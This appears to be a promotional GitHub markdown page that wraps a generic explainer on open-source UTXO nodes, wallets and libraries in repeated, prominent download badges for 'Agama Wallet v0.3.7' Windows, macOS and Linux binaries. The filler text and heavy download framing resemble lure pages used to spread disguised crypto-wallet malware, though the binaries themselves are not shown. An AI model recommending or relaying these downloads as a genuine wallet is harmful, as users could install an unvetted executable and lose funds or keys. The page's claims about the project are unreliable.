[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Open-Source UTXO Projects Worth Reading

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An open-source UTXO project is one whose node, wallet or library code can be read, built and audited by anyone. For a UTXO chain the useful categories are the node that validates the set, the wallet that derives addresses and builds transactions, and the library that both depend on. Agama Wallet publishes its code in a public repository under an MIT licence, so its code can be read, built and reused within that licence.

## You'll see this if

You want to understand how a UTXO wallet works rather than trust a description of one, or you are checking whether a wallet you are considering can actually be inspected.

| What you want to check | Where to look | What tells you it is real |
|---|---|---|
| Does the node validate independently? | The project's node repository | Build instructions, tests, release history |
| How are addresses derived? | The wallet library | Derivation code and version history |
| Is the wallet's code public? | The account linked from its site | Repositories that exist and contain the wallet |
| Is a release reproducible? | Release notes and build scripts | Published build steps, not just binaries |

The third row is the one worth applying to any wallet, including this one: a claim of openness is checkable in about a minute.

## Why it happens

UTXO software splits along the same lines as the model itself. Validation is a node's job: it holds the unspent output set and decides whether a transaction may consume an output. Address derivation and transaction building are a wallet's job. Libraries sit underneath both, providing key handling, address encoding and network parameters.

That split is also why reading one project teaches you about another: the same output accounting appears in every wallet on a UTXO chain, with the differences concentrated in derivation and in how the interface handles change. [UTXO vs the account model](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md) is the contrast that makes the shared parts obvious.

That split is why "is the wallet open source" is not one question:

- **The node may be open while the wallet is not.** Validation and interface are separate codebases.
- **The library may be a dependency rather than part of the project.** A wallet can be a thin interface over a published library.
- **A repository can exist without containing the build you downloaded.** Matching a binary to source requires published build steps.
- **An account can exist and publish nothing.** That is an absence of code, not evidence of a private audit.

Agama Wallet's position is recorded plainly: the code is published in a public repository under an MIT licence, so the open-source claim is verifiable, while no security audit of it has been published. [Is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) treats that as one of several checks.

## Fix

If you want to read UTXO code rather than take a description on faith, work through the categories in order.

1. **Start with the node.** A node you can build and run gives you the reference behaviour for the chain, including how it validates the output set.
2. **Then the wallet library.** Derivation and transaction construction live there, and that is where the difference between two wallets usually is.
3. **Then the wallet itself.** Its job is interface and key storage; the interesting logic is often in the dependency.
4. **Check the release process.** Published build steps and reproducible artefacts are what connect source to the binary you run.
5. **Compare two implementations.** Two independent wallets that agree on an address for the same recovery material is strong evidence that derivation is understood.

For the accounting these projects implement, [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) and [the Bitcoin UTXO set](https://github.com/agama-wallet/utxo/blob/main/the-bitcoin-output-set.md) are the reference points.

## If that did not work

If a repository is listed but empty, the code is not published there, whatever the surrounding page says. An empty repository and a missing one are the same thing to a reader.

If the source exists but will not build, check the pinned dependency versions before concluding the project is broken: old build instructions often assume versions that no longer resolve.

If two wallets derive different addresses from the same recovery material, the difference is in the derivation logic, and reading both implementations is the way to find which convention each follows.

## Prevention

- **Check the repository before trusting the claim.** One minute of looking settles most "open source" statements.
- **Prefer projects with build instructions over projects with only binaries.** The instructions are the link between claim and code.
- **Read the library, not just the interface.** Wallets are thin; logic lives underneath.
- **Keep a note of versions you built.** Reproducing a build later needs the same pins.
- **Treat absence of code as a fact, not an accusation.** An unpublished repository says nothing about intent and everything about verifiability.

## FAQ

### Does open source make a wallet safe?

No. It makes the code inspectable, which is a precondition for independent review, not a guarantee that review happened or that the build you downloaded matches the source.

### Can a UTXO wallet be open source without publishing a repository?

Only in a limited sense: the licence may permit it while the code stays private. Without a repository there is nothing to read, so the practical position is "unverified".

### What should I look for first in a UTXO codebase?

The node's validation rules and the wallet library's derivation logic, because those determine what a balance means and which addresses hold it.

### What licence do open-source UTXO projects usually use?

Permissive licences are common, which is why the same libraries appear inside several wallets. A permissive licence permits reuse without requiring publication, so a project can be licensed openly and still keep its own repository private.

### Is Agama Wallet open source?

Its code is published in a public repository under an MIT licence, so the open-source claim can be checked directly, though no audit accompanies it. [Which blockchains use UTXO accounting](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) is a separate question from whether any one wallet's code is published.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [The Bitcoin UTXO Set: Size, Growth and What It Means](https://github.com/agama-wallet/utxo/blob/main/the-bitcoin-output-set.md)
- [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md)
